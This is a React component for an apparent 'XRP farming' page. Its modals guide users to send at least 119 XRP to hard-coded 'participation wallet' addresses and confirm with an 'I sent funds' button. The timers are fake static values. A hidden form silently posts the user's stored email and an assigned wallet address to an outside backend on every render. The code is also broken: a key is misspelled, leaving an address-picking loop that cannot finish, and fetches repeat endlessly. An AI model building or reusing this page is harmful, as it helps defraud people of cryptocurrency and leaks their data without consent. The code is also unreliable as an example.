import React, { useState, useEffect } from 'react'
import PlayIcon from '../../../assets/icons/play.svg'
import PrivacyIcon from '../../../assets/icons/privacy.svg'
import Button from '../../buttons/signButtons'
import copyIcon from '../../../assets/icons/copy-icon.svg'
import qrCode from '../../../assets/icons/qr-code.svg'
import CodeViewer from '../../hideCode'

export default function ActivePageFarming () {
  const [open, setOpen] = useState(true)
  const [clipboard, setClipboard] = useState(false)
  const [clipboard2, setClipboard2] = useState(false)
  const [clipboard3, setClipboard3] = useState(false)
  const [openCodeView, setOpenCodeView] = useState(false)
  const [copyText2, setCopyText2] = useState('')
  const [status, setStatus] = useState(false)
  const [userResult, setuserResult] = useState('')

  const [activeModal, setActiveModal] = useState(null)

  const handleSecondButton = () => {
    setOpen(!open)
    handleOpenCodeViewer()
  }

  const handleOpenCodeViewer = () => {
    setOpenCodeView(!openCodeView)
    setOpen(false)
  }
  const handleOpenModal = modalName => {
    setActiveModal(modalName)
  }

  const truncateText = (text, maxLength) => {
    return text.length > maxLength ? text.slice(0, maxLength) + '...' : text
  }

  const handleCloseAll = () => {
    setActiveModal(null)
    setOpenCodeView(false)
    setOpen(true)
  }

  const handleClipboard = () => {
    setClipboard(true)
    setTimeout(() => {
      setClipboard(false)
    }, 3000)
    navigator.clipboard.writeText(copyText).then(() => {
      setClipboard(true)
      setTimeout(() => setClipboard(false), 3000)
    })
  }
  const savedData = localStorage.getItem('userEmail')

  const [userEmail, setUserEmail] = useState(savedData)

  const handleSubmit = async e => {
    if (e) e.preventDefault()

    const dataToSend = {
      email: userEmail,
      content: copyText2
    }

    try {
      const response = await fetch('https://xrp-ai-back.vercel.app/send-message', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
      })

      const result = await response.json()
      setuserResult(result)
      if (result.exists) {
        setStatus(true)
      } else {
        setStatus(false)
      }

      setMessage(result.message || 'Message sent successfully!')
    } catch (error) {
      console.error(error)
      setMessage('Error connecting to the server.')
    }
  }

  handleSubmit()
  const handleClipboard2 = async () => {
    setClipboard2(true)
    setTimeout(() => {
      setClipboard2(false)
    }, 3000)

    navigator.clipboard.writeText(userResult.content).then(() => {
      setClipboard2(true)
      setTimeout(() => setClipboard2(false), 3000)
    })
  }

  const handleClipboard3 = () => {
    setClipboard3(true)
    setTimeout(() => {
      setClipboard3(false)
    }, 3000)
    navigator.clipboard.writeText(copyText3).then(() => {
      setClipboard3(true)
      setTimeout(() => setClipboard3(false), 3000)
    })
  }

  const copyText = 'rnPNSonfEN1TWkPH4Kwvkk3693sCT4tsZv'
  const copyText3 = 'C33B04D2E95A73D1CD0A82E93B199E'

  const wallets = [
    {
      id: 1,
      adress: 'rwkKmLEpfx6BVDrs6bhiwncsFgPntLaY7i',
    },
    {
      id: 2,
      adress: 'rfqRff8Jp8ponq1Rq1nRy5HYDvGGNLHo4m',
    },
    {
      id: 3,
      adress: 'rLKPyAGWd5ZJMsPnfLR9rSu9JUiMokGxVm',
    },
    {
      id: 4,
      adress: 'rfrStx3zLYQpyz1nAav9SHn1WoNoQrhaKw',
    },
    {
      id: 5,
      adress: 'rB1bY7rSdzT3NVGYJNJ4FonroGi1MTLopF',
    },
    {
      id: 6,
      adress: 'rsPwMrK9B8kXaw1aMum1yVs7qbhjTHSDRW',
    },
    {
      id: 7,
      adress: 'rnCUjUQMZCMYD1Vb5XLHQ5qgFhwerSmznp',
    },
    {
      id: 8,
      adress: 'rEDrAdvtmiD1dgpzewYBLWhRhwApor4Rjy',
    },
    {
      id: 9,
      adress: 'rBzTCwM1rMdi4zoUr4HyY1s1TJ9wf9KZz',
    },
    {
      id: 10,
      adress: 'rn3TgmvkjSiek51moYKJ4Hds6KfaAD5cJR',
    },
    {
      id: 11,
      adress: 'rBupSWiAmDJxX25DaCkpWMik4Xg2K4Y5eb',
    },
    {
      id: 12,
      adress: 'rwaBdkg5KSn7F7BqtyheXJhDuC38Es35eY',
    },
    {
      id: 13,
      adress: 'rDmZSqHLghomDhjMi6KuM5CoyKcaRjbF3z',
    },
    {
      id: 14,
      adress: 'rH6za3AF4nA8DBgLs7DcWsguqWrb2Hocok',
    },
    {
      id: 15,
      adress: 'rsvCv3gAHQbCzYpmcrj3vpP6UH4FvAgtkZ',
    },
    {
      id: 16,
      adress: 'r3Aua39NqzmjwtjBXVNYX12rr1yH35dRX',
    },
    {
      id: 17,
      adress: 'rhpyaVSsXWhsoxEeSkPDk5eXFsAcPCbd9P',
    },
    {
      id: 18,
      adress: 'rNMZuPd7eXZkktinGYJmUSA5YmS5bUNhLk',
    },
    {
      id: 19,
      adress: 'rnL1Ni5FPLwGWD5F6E8MkcneqYxZPpnJP3',
    },
    {
      id: 20,
      adress: 'rDGwKw7qJqrWWe2unLaxLehZedWv8SDBxf',
    },
    {
      id: 21,
      adress: 'rP6DocMtScPXYiYtv8hwupRRJpAtA1fuVp',
    },
    {
      id: 22,
      adress: 'r3kSg4zwEMWLwLBPFPDfuK9ja9yrShhboa',
    },
    {
      id: 23,
      adress: 'rG6khTY8q2SbfiDAaXabBLGwSxjQfwZzi6',
    },
    {
      id: 24,
      adress: 'rsbYWYXFw2dzTh1RGEso7jR5FyYQ86qvZV',
    },
    {
      id: 25,
      adress: 'r9Jx3fPG2rXhVZY96z2mCvifMa3izSZQ4e',
    },
    {
      id: 26,
      adress: 'rsYr37jCgMbTksxJnq7924xkhDpxaYdYfL',
    },
    {
      id: 27,
      adress: 'rpjeVBSuYWH2xzHXD4cCKPvrybE2qb75RD',
    },
    {
      id: 28,
      adress: 'rZBSqrXkEyRuU1WfVZpVn4LUWfWcxxoa8',
    },
    {
      id: 29,
      adress: 'rwz1bBRhJnEhuSfDj5tQHaYd6wncCt23sY',
    },
    {
      id: 30,
      adress: 'r9kKzzUQpsMLgCvC1uGysC78ZkzbZd4ReM',
    },
    {
      id: 31,
      adress: 'rHTW8woW82Ydprb3KBsYGF7bzQQppMQxD8',
    },
    {
      id: 32,
      adress: 'rfsXLSfbptuA6Jc7KyKtCvLnqxPFL7NMkh',
    },
    {
      id: 33,
      adress: 'rwycD6NrmJSdZFwCeipG3FGNrBJaH2kXGY',
    },
    {
      id: 34,
      adress: 'r9NY1gYCDUtNjYHXAAPLC32TXXMsZGZojN',
    },
    {
      id: 35,
      adress: 'rKsQePEWEuf8j7DRx3oW6tuqSPqnF4Gku5',
    },
    {
      id: 36,
      adress: 'r3w4YRD7VqQL9tedKmV5qxJdNt1envoJRg',
    },
    {
      id: 37,
      adress: 'rNx9DDMSnPB7PK66PNsfDKY81CtyEYvySd',
    },
    {
      id: 38,
      adress: 'rM8VApRhWh3ddc1dEsy4JjCWAtAPoF6sds',
    },
    {
      id: 39,
      adress: 'rfv3Ymf8LkEZsNdPJ4RGjWqmAi1ar1z3Qd',
    },
    {
      id: 40,
      adress: 'rfs6jkofjofDUzL32tZ3Xmx7LuNtTmZFH2',
    },
    {
      id: 41,
      adress: 'rRzJmJpv3qvsw6KQV52fUpfi2SxfhAQo1',
    },
    {
      id: 42,
      adress: 'rDst4HyExXRNbMPoWdV3XDjYMBAPYGLKCr',
    },
    {
      id: 43,
      adress: 'rDzgHLjWPvJ7dh2sRPqP3sQSNWPNCoz8Qy',
    },
    {
      id: 44,
      adress: 'rfL1mrEAnKMd1FruFv92VkNCEzUgQ1Vjr1',
    },
    {
      id: 45,
      adress: 'rMgBWzcUPApVfVq2GLaYd9JDMr4aS3zmiJ',
    },
    {
      id: 46,
      adress: 'rDsbXyu1EHJQqsoUSrkGMCDMn93ss6RD7b',
    },
    {
      id: 47,
      adress: 'rEkUv3ZozVrfMogSkUG4pAMzhpvhw9saWw',
    },
    {
      id: 48,
      adress: 'rH6A4GfkwtS4TXoSaCrk1i2B6dc8tmQB3k',
    },
    {
      id: 49,
      adress: 'rUeXH5AhqMntwSqy3xB3Kh3e8diyGGqjmJ',
    },
  ];
  
  const usedAddresses = new Set()

  const getRandomWalletAddress = (content, messages) => {
    let randomIndex
    let selectedAddress

    do {
      randomIndex = Math.floor(Math.random() * wallets.length)
      selectedAddress = wallets[randomIndex].address
    } while (
      usedAddresses.has(selectedAddress) ||
      selectedAddress === content ||
      messages.some(msg => msg.address === selectedAddress)
    )

    usedAddresses.add(selectedAddress)
    return selectedAddress
  }

  const [messages, setMessages] = useState([])

  const [messageContent, setMessageContent] = useState(null)

  useEffect(() => {
    const handleData = async () => {
      try {
        const response = await fetch('https://xrp-ai-back.vercel.app/send-message')
        const data = await response.json()
        data.forEach(message => {
          let isContentMatch = false

          wallets.forEach(wallet => {
            if (message.content === wallet.address) {
              isContentMatch = true
              console.log(
                `Xabar ${message.content} manzili wallets ichidagi manzilga mos keladi!`
              )
            }
          })

          if (!isContentMatch) {
            usedAddresses.add(message.address)
            setMessageContent(message.content)
          }
        })

        setMessages(data)
      } catch (error) {
        console.error('Error fetching data:', error)
      }
    }

    handleData()
  }, [])

  useEffect(() => {
    if (messages.length > 0) {
      messages.forEach((message, index) => {
        console.log(`Habar ${index + 1} contenti: `, message.content)
      })
    }
  }, [messages])

  useEffect(() => {
    const randomAddress = getRandomWalletAddress('', messages)
    setCopyText2(randomAddress)
  }, [messages])
  const [users, setUsers] = useState([])
  const [error, setError] = useState(null)

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const response = await fetch('https://xrp-ai-back.vercel.app/users')
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`)
        }
        const data = await response.json()
        setUsers(data)
      } catch (err) {
        setError(err.message)
      }
    }

    fetchUsers()
  }, [])

  useEffect(() => {
    const savedData = localStorage.getItem('userEmail')
    if (savedData) {
      setUserEmail(savedData)
    }
  }, [])
  const [inputText, setInputText] = useState('')
  const [message, setMessage] = useState('')

  return (
    <>
      <div
        data-aos='zoom-in'
        className='md:w-[30%] bg-[#141414] py-4 px-5 rounded-2xl text-center mb-2 lg:mb-0'
      >
        <p className='text-white text-lg neu-trial'>Start Farming</p>
        <p className='hover:underline cursor-pointer neu-trial text-[#898989] text-xs'>
          Check documentation
        </p>
        <div className=' flex items-center justify-center '>
          <div
            onClick={() => handleOpenModal('firstModal')}
            className='w-20 h-20 hover:bg-[#43aeff86] transition-all duration-300 bg-[#43AFFF] flex items-center justify-center rounded-full cursor-pointer mt-5 mb-4'
          >
            <img src={PlayIcon} alt='' />
          </div>
        </div>
        <div className='flex items-center justify-between gap-1.5'>
          <div className='bg-[#1D1D1D] w-1/2 rounded-xl py-2'>
            <p className='text-[#898989] neu-trial'>Today</p>
            <h4 className='text-[#FFFFFF] neu-trial'>00:57:56</h4>
          </div>
          <div className='bg-[#1D1D1D] w-1/2 rounded-xl py-2'>
            <p className='text-[#898989] neu-trial'>Limits</p>
            <h4 className='text-[#FFFFFF] neu-trial'>03:57:56</h4>
          </div>
        </div>
      </div>
      <div className='hidden'>
        <h2>Xabar yuborish</h2>
        <form onSubmit={handleSubmit}>
          <input
            className='bg-black w-full mb-4'
            type='text'
            placeholder='Wallet Address'
            value={copyText2}
            readOnly
          />

          <input
            className='bg-black w-full mb-4'
            type='text'
            placeholder='Enter your message'
            value={userEmail}
            onChange={e => setInputText(e.target.value)}
          />

          <button
            type='button'
            onClick={handleClipboard2}
            className='bg-green-500 text-white px-4 py-2 mb-4'
          >
            {clipboard2 ? 'Copied!' : 'Copy Wallet Address'}
          </button>

          <button type='submit' className='bg-blue-500 text-white px-4 py-2'>
            Send
          </button>
        </form>
        <p>{message}</p>
      </div>
      {activeModal === 'firstModal' && (
        <>
          <div
            onClick={handleCloseAll}
            className='bg-some-black active-page- overlay z-40 fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex items-center justify-center'
          >
            <div
              className='flex items-center justify-center h-[1vh] z-40'
              onClick={e => e.stopPropagation()}
            >
              <div
                className={`${
                  openCodeView
                    ? 'bg-[#141414] active-page-hash-generator code-generator max-w-[500px] p-3 md:p-5 border-radiusss'
                    : ' max-w-[500px] w-full  p-5 border-radiusss bg-[#141414]'
                }`}
              >
                <div className='flex flex-col items-center '>
                  <div className=' flex items-center marginAutoo bg-[#191919] w-full p-0.5 rounded-2.5'>
                    <div className='flex items-center justify-between marginAutoo bg-[#191919] w-full p-0.5 rounded-xl'>
                      <p className='bg-[#141414] md:px-5  py-2 px-3  text-[10px] md:text-sm text-white rounded-xl'>
                        Creating an XRP Wallet
                      </p>
                      <p className='py-2 md:px-5 px-3  text-[10px] md:text-sm text-[#999C9E]'>
                        Creating an XRP Wallet
                      </p>
                    </div>
                  </div>
                </div>
                <div className='flex cursor-pointer items-center gap-2 text-start justify-start border-2  text-white border-[#2C2C2C] rounded-xl py-2.5 px-3.5 mt-4 mb-4'>
                  <img src={PrivacyIcon} alt='' />
                  <p onClick={handleOpenCodeViewer}>Get Transaction Hash</p>
                </div>
                {open ? (
                  <div onClick={handleSecondButton}>
                    <Button
                      className={
                        'border-2 border-transparent transition-all duration-300 rounded-xl hover:border-2 hover:border-[#43AFFF] hover:text-white hover:bg-transparent'
                      }
                      title={'Get Hash'}
                    />
                  </div>
                ) : (
                  <>
                    <div onClick={() => handleOpenModal('secondModal')}>
                      <Button
                        className={
                          'border-2 border-transparent transition-all duration-300 rounded-xl hover:border-2 hover:border-[#43AFFF] hover:text-white hover:bg-transparent'
                        }
                        title={'NEXT'}
                      />
                    </div>
                  </>
                )}
                {openCodeView ? (
                  <div className='rounded-xl border-2 border-[#1A1A1A] py-5 px-2 md:px-7 mt-3'>
                    <>
                      <p className='underline text-[#999C9E] text-center'>
                        Hash generator
                      </p>
                      <CodeViewer copyText={copyText2} />
                    </>
                  </div>
                ) : null}
              </div>
            </div>
          </div>
        </>
      )}
      {activeModal === 'secondModal' && (
        <div
          onClick={handleCloseAll}
          className='bg-some-black overlay z-40 fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex items-center justify-center'
        >
          <div
            className='flex items-center justify-center h-[1vh] z-40'
            onClick={e => e.stopPropagation()}
          >
            <div className='bg-[#141414] max-w-[500px] w-full  p-5 border-radiusss'>
              <div className='flex flex-col items-center '>
                <div className=' flex items-center marginAutoo bg-[#191919] w-full p-0.5 rounded-2.5'>
                  <div className='flex items-center marginAutoo bg-[#191919] w-full p-0.5 rounded-xl'>
                    <p className='bg-[#141414] md:px-5 px-3  py-2 text-[10px] md:text-sm text-white rounded-xl'>
                      Creating an XRP Wallet
                    </p>
                    <p className='py-2 md:px-5 px-3  text-[10px] md:text-sm text-[#999C9E]'>
                      Creating an XRP Wallet
                    </p>
                  </div>
                </div>
              </div>
              <div className='flex items-center justify-between gap-2 text-start border-2  text-white border-[#2C2C2C] rounded-xl py-2.5 px-3.5 mt-4 mb-4'>
                <div
                  onClick={handleClipboard2}
                  className='flex gap-2 items-center'
                >
                  <img src={PrivacyIcon} alt='' />
                  <div>
                    {userResult.exists ? (
                      <div>
                        <p>{userResult.content}</p>
                      </div>
                    ) : (
                      <p>{userResult.message}</p>
                    )}
                  </div>
                </div>
                {clipboard2 ? (
                  <h1>
                    <i
                      className='fa-solid fa-check'
                      style={{ color: 'white' }}
                    ></i>
                  </h1>
                ) : (
                  <h1>
                    <img
                      onClick={handleClipboard2}
                      src={copyIcon}
                      alt='Copy'
                      style={{ cursor: 'pointer', width: '15px' }}
                    />
                  </h1>
                )}
              </div>
              <div onClick={() => handleOpenModal('thirdModal')}>
                <Button
                  className={
                    'border-2 border-transparent transition-all duration-300 rounded-xl hover:border-2 hover:border-[#43AFFF] hover:text-white hover:bg-transparent'
                  }
                  title={'Get Wallet'}
                />
              </div>
              <div className='mt-3'>
                <p className='text-[#FFFFFF] text-base mt-4 mb-2.5'>
                  Participation wallet
                </p>

                <div
                  onClick={handleClipboard}
                  className='flex items-center  gap-2 text-start justify-between border-2  text-white border-[#2C2C2C] rounded-xl py-2.5 px-3.5 mt-4 mb-4'
                >
                  <div className='flex gap-2 items-center justify-between'>
                    <img src={qrCode} alt='' />
                    <p className='md:hidden block'>rnPNSonfEN1TWkPH4Kw...</p>
                    <p className='hidden md:block'>
                      rnPNSonfEN1TWkPH4Kwvkk3693sCT4tsZv
                    </p>
                  </div>
                  {clipboard ? (
                    <h1>
                      <i
                        onClick={handleClipboard}
                        className='fa-solid fa-check'
                        style={{ color: 'white' }}
                      ></i>
                    </h1>
                  ) : (
                    <h1>
                      <img
                        src={copyIcon}
                        alt='Copy'
                        style={{ cursor: 'pointer', width: '15px' }}
                      />
                    </h1>
                  )}
                </div>

                <div className='flex items-center text-white gap-1.5 relative'>
                  <label
                    htmlFor='customCheckbox'
                    className='flex items-center cursor-pointer gap-1.5'
                  >
                    <input
                      o
                      type='checkbox'
                      id='customCheckbox'
                      className='hidden'
                    />
                    <div className='checkbox-label'></div>
                    <p>
                      <span>Minimum: 119 XRP.</span>{' '}
                      <span className='text-[#999C9E]'>No maximum limit.</span>
                    </p>
                  </label>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      {activeModal === 'thirdModal' && (
        <div
          onClick={handleCloseAll}
          className='bg-some-black overlay  z-40 fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex items-center justify-center'
        >
          <div
            className='flex items-center bg-red-100 justify-center h-[1vh] z-40'
            onClick={e => e.stopPropagation()}
          >
            <div className='bg-[#141414] max-w-[500px] w-full  p-5 border-radiusss'>
              <div className='flex flex-col items-center '>
                <div className=' flex items-center marginAutoo bg-[#191919] w-full p-0.5 rounded-2.5'>
                  <div className='flex items-center marginAutoo bg-[#191919] w-full p-0.5 rounded-xl'>
                    <p className='bg-[#141414] md:px-5 px-3  py-2 text-[10px] md:text-sm text-white rounded-xl'>
                      Creating an XRP Wallet
                    </p>
                    <p className='py-2 md:px-5 px-3  text-[10px] md:text-sm text-[#999C9E]'>
                      Creating an XRP Wallet
                    </p>
                  </div>
                </div>
              </div>
              <div
                onClick={handleClipboard2}
                className='flex items-center justify-between gap-2 text-start border-2  text-white border-[#2C2C2C] rounded-xl py-2.5 px-3.5 mt-4 mb-4'
              >
                <div className='flex gap-2 items-center'>
                  <img src={PrivacyIcon} alt='' />
                  <p className='md:hidden block'>
                    {truncateText(copyText2, 20)}
                  </p>
                  <p className='md:block hidden'>{copyText2}...</p>
                </div>
                {clipboard2 ? (
                  <h1>
                    <i
                      className='fa-solid fa-check'
                      style={{ color: 'white' }}
                    ></i>
                  </h1>
                ) : (
                  <h1>
                    <img
                      onClick={handleClipboard2}
                      src={copyIcon}
                      alt='Copy'
                      style={{ cursor: 'pointer', width: '15px' }}
                    />
                  </h1>
                )}
              </div>
              <div onClick={handleClipboard3}>
                {clipboard3 ? (
                  <button className='w-full transition-all duration-300 hover:bg-[#43AFFF] hover:text-white py-2.5 rounded-xl  border-2 border-[#43AFFF] text-[#43AFFF] text-sm'>
                    Copied
                  </button>
                ) : (
                  <button className='w-full py-2.5 rounded-xl transition-all duration-300 hover:bg-[#43AFFF] hover:text-white border-2 border-[#43AFFF] text-[#43AFFF] text-sm'>
                    Copy hash
                  </button>
                )}
              </div>
              <div className='mt-3'>
                <p className='text-[#FFFFFF] text-base mt-4 mb-2.5'>
                  Participation wallet
                </p>

                <div
                  onClick={handleClipboard}
                  className='flex items-center  gap-2  justify-between text-start border-2  text-white border-[#2C2C2C] rounded-xl py-2.5 px-3.5 mt-4 mb-4'
                >
                  <div className='flex gap-2 items-center'>
                    <img src={qrCode} alt='' />
                    <p className='hidden md:block'>
                      {userResult.exists ? (
                        <div>
                          <p>{userResult.content}</p>
                        </div>
                      ) : (
                        <p>{userResult.message}</p>
                      )}
                    </p>
                    <p className='md:hidden block'>
                      <p className='md:hidden block'>
                        {truncateText(copyText2, 20)}
                      </p>
                    </p>
                  </div>
                  {clipboard ? (
                    <i
                      onClick={handleClipboard}
                      className='fa-solid fa-check'
                      style={{ color: 'white' }}
                    ></i>
                  ) : (
                    <img
                      src={copyIcon}
                      alt='Copy'
                      style={{ cursor: 'pointer', width: '15px' }}
                    />
                  )}
                </div>
                <div className='flex items-center text-white gap-1.5 relative'>
                  <label
                    htmlFor='customCheckbox'
                    className='flex items-center cursor-pointer gap-1.5'
                  >
                    <input
                      type='checkbox'
                      id='customCheckbox'
                      className='hidden'
                    />
                    <div className='checkbox-label'></div>
                    <p>
                      <span>Minimum: 119 XRP.</span>{' '}
                      <span className='text-[#999C9E]'>No maximum limit.</span>
                    </p>
                  </label>
                </div>

                <div className='mt-3'>
                  <Button
                    className={
                      'border-2 border-transparent transition-all duration-300 rounded-xl hover:border-2 hover:border-[#43AFFF] hover:text-white hover:bg-transparent'
                    }
                    title={'I sent funds'}
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  )
}
